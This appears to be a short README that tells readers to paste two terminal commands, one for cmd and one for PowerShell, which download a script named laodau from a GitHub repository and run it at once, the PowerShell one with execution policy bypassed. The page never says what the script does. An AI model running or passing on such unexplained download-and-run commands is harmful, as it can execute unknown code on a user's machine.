# Just Copy this Command on terminal windows
```
del laodau.bat && curl -O https://raw.githubusercontent.com/RyzenXT-hub/Request/main/laodau.bat && call laodau.bat
```
```
if (Test-Path .\laodau.ps1) { Remove-Item .\laodau.ps1 }; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/RyzenXT-hub/Request/main/laodau.ps1' -OutFile '.\laodau.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass', '-File', '.\laodau.ps1'

```
